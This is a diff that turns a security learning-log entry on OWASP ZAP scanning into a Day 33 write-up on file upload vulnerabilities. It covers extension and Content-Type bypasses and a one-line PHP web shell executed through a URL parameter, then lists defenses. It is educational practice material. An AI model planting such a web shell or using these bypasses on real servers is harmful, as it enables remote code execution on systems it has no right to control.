@@ -1,21 +1,32 @@
-## 🗓️ Day 32/100 – OWASP ZAP (Automated Scanning)
+## 🗓️ Day 33/100 – File Upload Vulnerabilities
 
-**Focus:** Using automated tools to map attack surfaces and detect common vulnerabilities.
+**Focus:** Exploiting weak validation to upload malicious scripts (Web Shells).
 
-### ⚡ What is OWASP ZAP?
-The Zed Attack Proxy (ZAP) is a free, open-source penetration testing tool maintained by OWASP. It acts as a "Man-in-the-Middle" proxy (similar to Burp Suite) but specializes in automated scanning.
+### 📂 What is a File Upload Vulnerability?
+It occurs when a web server allows users to upload files without sufficiently validating their name, type, contents, or size. This can lead to RCE (Remote Code Execution).
 
-### 🛠️ Workflow Executed
-1.  **Spidering (Crawling):**
-    *   ZAP automatically navigated the application to discover all accessible URLs, including those not visible in the navigation menu.
-    *   *Result:* Complete site map generated in <2 minutes.
+### ⚔️ Attack Techniques Practiced
 
-2.  **Active Scanning:**
-    *   ZAP injected malicious payloads (SQLi, XSS, CRLF) into every identified parameter.
-    *   *Result:* Detected 15+ alerts ranging from "Missing Security Headers" (Low) to "Reflected XSS" (High).
+**1. Extension Bypassing**
+*   *Filter:* Server blocks `.php` files.
+*   *Bypass:* Uploading as `.php5`, `.phtml`, or `.php.jpg` (Double Extension).
 
-3.  **Passive Scanning:**
-    *   Analyzed traffic without sending attacks to find issues like sensitive cookies without `HttpOnly` or missing `CSP` headers.
+**2. Content-Type Spoofing**
+*   *Filter:* Server checks `Content-Type` header.
+*   *Bypass:* Intercepted request in Burp Suite and changed:
+    `Content-Type: application/x-php` ➔ `Content-Type: image/jpeg`
 
-### 🧠 Learning Outcome
-Automation is a double-edged sword. It helps defenders find holes quickly, but it also allows script kiddies to launch sophisticated scans with zero knowledge. A robust security program must include regular automated scans.
+**3. Web Shell Execution**
+*   Uploaded a simple payload:
+    ```php
+    <?php system($_GET['cmd']); ?>
+    ```
+*   Accessed via: `http://target.com/uploads/shell.php?cmd=ls`
+*   *Result:* Server listed directory contents, confirming RCE.
+
+### 🛡️ Defense Mechanisms
+*   **Strict Allow-list:** Only allow specific extensions (e.g., `.jpg`, `.png`).
+*   **Rename on Save:** Randomize filenames (`a1b2c3.jpg`) to prevent overwriting or guessing.
+*   **Non-Executable Directories:** Ensure the upload folder does not have "Execute" permissions.
+
+**Day 33 Takeaway:** File uploads are high-risk features. Without rigorous validation, they are essentially an open door for malware.
